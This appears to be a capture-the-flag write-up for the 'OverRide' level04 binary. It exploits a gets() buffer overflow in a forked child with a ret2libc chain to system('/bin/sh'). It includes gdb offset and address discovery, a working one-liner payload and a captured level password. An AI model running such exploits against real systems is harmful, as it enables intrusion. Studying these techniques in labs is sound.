## Step 1: Static & Dynamic Analysis

```c
int main(int argc, const char **argv, const char **envp)
{
  int wait_status;
  int i;
  int j;
  int k;
  char buffer[128];
  __pid_t pid;

  pid = fork();
  memset(buffer, 0, sizeof(buffer));
  k = 0;
  wait_status = 0;
  if ( pid )
  {
    do
    {
      wait(&wait_status);
      i = wait_status;
      if ( (wait_status & 0x7F) == 0 || (j = wait_status, (char)((wait_status & 0x7F) + 1) >> 1 > 0) )
      {
        puts("child is exiting...");w
        return 0;
      }
      k = ptrace(PTRACE_PEEKUSER, pid, 44, 0);
    }
    while ( k != 11 );
    puts("no exec() for you");
    kill(pid, 9);
  }
  else
  {
    prctl(1, 1);
    ptrace(PTRACE_TRACEME, 0, 0, 0);
    puts("Give me some shellcode, k");
    gets(buffer);
  }
}
```

### Explanation
This program creates a child process using `fork()`.
The child process uses `get()` to fill a `buffer` without checking its size.
The vulnerability is found in the child process where `get()` fills `buffer` without checking the number of characters `get()` can accept.
This will enable us to make a buffer overflow and perform a `ret2libc` attack.
This attack consists in overriding the copy `eip` copy with the address of the function`system()` and pass the `/bin/sh` string as parameter in order to open a shell terminal.

First we are going to use gdb command:

```bash
(gdb) set follow-fork-mode child
```
to follow every events happening in the child process instead of the parent process.

Now we need to find the offset to override `eip` copy, we set a breakpoint just behind `get()` and look for the padding to reach `eip` copy.

```bash
(gdb) b *0x08048763
(gdb) r < <(python -c 'print("A" * 156 + "BBBBBBBBBBBB")')
Starting program: /home/users/level04/level04 < <(python -c 'print("A" * 156 + "BBBBBBBBBBBB")')
[New process 1801]
Give me some shellcode, k
[Switching to process 1801]
child is exiting...
Breakpoint 4, 0x08048763 in main ()
(gdb) x/4xw $ebp
0xffffd718:    0x41414141    0x42424242    0x42424242    0x42424242
```

Then we find the address of both functions `system()`, `exit()` and the string `/bin/sh` to perform the attack.

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find 0xf7e2c000, 0xf7ffe000, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

## Step 2: Exploiting the Binary

```bash
level04@OverRide:$ (python -c 'print ("A" * 156) + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]';cat) | ./level04
% cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```